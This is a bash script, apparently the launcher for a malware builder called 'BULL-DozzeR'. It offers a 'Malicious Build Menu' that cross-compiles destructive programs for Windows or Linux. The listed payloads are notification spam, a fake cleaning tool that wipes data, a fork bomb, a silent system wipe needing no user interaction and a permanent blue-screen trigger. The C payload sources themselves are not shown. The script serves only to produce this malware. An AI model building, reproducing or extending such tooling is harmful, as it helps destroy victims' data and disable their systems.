#!/usr/bin/env bash

while true; do
    clear
    echo -e "\e[31m
⠄⠄⠄⠄⠄⠄⣠⢿⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⡿⣄
⠄⠄⠄⠄⠄⣰⢳⡌⣿⢀⣀⣀⣀⠄⠄⠄⠄⢀⣀⣀⡀⡞⢠⣎⣆
⠄⠄⠄⠄⢸⣣⣿⣧⠛⠉⠉⠄⠈⠉⠉⠉⠉⠉⠁⠈⠉⠁⢴⣧⣌⡆
⠄⠄⠄⠄⣾⣻⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢛⣿⣷
⠄⠄⠄⠄⣿⡏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣿⣿
⠄⠄⠄⠄⣿⣷⡤⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢹⣾⣿⣿
⠄⠄⠄⠄⡿⣏⣧⣤⣀⣀⠄⠄⠄⣺⠄⢠⡏⠄⠄⠄⣀⣤⣤⣽⣿⣿
⠄⠄⠄⢰⢷⣿⢿⣷⣉⠛⣻⣦⣀⡿⠄⠈⠃⠰⣶⣞⠋⣉⣿⠗⠉⣿⡇
⠄⠄⠄⣾⣸⣯⡴⠈⠙⠛⠛⠋⠁⠄⠬⠭⣗⡀⠹⠿⣿⣫⡅⠄⣠⣿⣿
⠠⣤⡶⢿⣗⣿⣿⣦⠄⠄⠄⠄⠄⠐⠒⠒⠚⢯⡀⠸⣿⣿⣧⣾⣿⣿⣿⣦⣤⠄
⠄⠄⠉⠻⣿⣿⣿⣿⣿⣓⢀⣴⣿⣿⣿⣿⣤⣶⡆⣰⣿⣿⣿⣿⣿⣿⠟⠉
⠄⠄⠄⢀⣿⠙⣿⣿⣿⡛⡿⠛⠛⢻⣿⡿⠛⠛⠋⠘⣻⣿⣿⣿⠋⣿⡀
⣀⣴⣞⣉⣀⣢⢹⣿⣿⣷⡅⠄⢀⣨⣿⣇⣀⡀⠄⣸⣿⣿⣿⡇⣰⣟⣉⣓⣤⣀
⠉⠉⠉⠉⠉⠻⣦⡻⣿⣿⣿⣦⣿⣿⣿⡿⢿⣿⣾⣿⣿⣿⣿⣷⠏⠉⠉⠉⠉
⠄⠄⠄⠄⠄⣰⠋⣹⣦⣝⡻⠿⣿⣿⡿⠿⠿⠿⢻⣿⣿⣿⡿⠻⣆
⠄⠄⠄⠄⣼⡷⠟⠛⠙⠻⣿⠷⣶⣶⣶⣶⣶⣶⣿⣿⠟⠋⠛⠲⢮⣧
⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⢸⢀⡴⠋⠉⠉⠹⢇⢀⡇⠄⠄⠄⠄⠄⠄⠁
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⡟⠁⠄⠄⠄⠄⠈⢻⡇
\e[0m"
    echo -e "\e[31m
 ____  _   _ _     _          ____                        
| __ )| | | | |   | |        |  _ \  ___ ___________ _ __ 
|  _ \| | | | |   | |   _____| | | |/ _ \_  /_  / _ \ '__|
| |_) | |_| | |___| |__|_____| |_| | (_) / / / /  __/ |   
|____/ \___/|_____|_____|    |____/ \___/___/___\___|_|   
\e[0m"

    echo "===== Malicious Build Menu ====="
    echo "1) Build annoying.exe"
    echo "   - System annoyance payload (spams notifications, duplicates apps)"
    echo "2) Build wipe.exe"
    echo "   - Fake cleaning tool (requires user consent via UAC prompts)"
    echo "3) Build forkbomb.exe"
    echo "   - Fork bomb (consumes all system resources, causes freeze)"
    echo "4) Build silentwipe.exe"
    echo "   - Silent system wipe (no interaction required)"
    echo "5) Build BSOD.exe"
    echo "   - Permanent BSOD trigger (Windows only)"
    echo "6) Exit"
    echo "================================"

    read -p "Choose an option: " choice

    case $choice in
        1|2|3|4|5)
        clear
            echo -e "\e[31m
 ____  _   _ _     _          ____                        
| __ )| | | | |   | |        |  _ \  ___ ___________ _ __ 
|  _ \| | | | |   | |   _____| | | |/ _ \_  /_  / _ \ '__|
| |_) | |_| | |___| |__|_____| |_| | (_) / / / /  __/ |   
|____/ \___/|_____|_____|    |____/ \___/___/___\___|_|   
\e[0m"
            echo "Select target platform:"
            echo "1) Windows"
            if [ $choice -ne 5 ]; then
                echo "2) Linux"
            fi
            read -p "Choose platform: " platform
            
            cd BULL-DozzeR
            
            case $platform in
                1)
                    compiler="x86_64-w64-mingw32-gcc"
                    extension=".exe"
                    target="Windows"
                    ;;
                2)
                    if [ $choice -eq 5 ]; then
                        echo "BSOD is Windows-only! Building for Windows instead."
                        compiler="x86_64-w64-mingw32-gcc"
                        extension=".exe"
                        target="Windows"
                    else
                        compiler="gcc"
                        extension=""
                        target="Linux"
                    fi
                    ;;
                *)
                    echo "Invalid platform selection. Building for Windows by default."
                    compiler="x86_64-w64-mingw32-gcc"
                    extension=".exe"
                    target="Windows"
                    ;;
            esac
            
            case $choice in
                1)
                    $compiler -o annoying$extension annoying.c
                    echo "Build successful - annoying$extension created for $target"
                    ;;
                2)
                    $compiler -o wipe$extension wipe.c
                    echo "Build successful - wipe$extension created for $target"
                    ;;
                3)
                    $compiler -o forkbomb$extension forkbomb.c
                    echo "Build successful - forkbomb$extension created for $target"
                    ;;
                4)
                    $compiler -o silentwipe$extension silentwipe.c
                    echo "Build successful - silentwipe$extension created for $target"
                    ;;
                5)
                    $compiler -o BSOD$extension BSOD.c
                    echo "Build successful - BSOD$extension created for $target"
                    ;;
            esac
            ;;
        6)
            echo "Goodbye!"
            break
            ;;
        *)
            echo "Invalid option, try again."
            ;;
    esac

    echo
    read -p "Press Enter to continue..." pause
done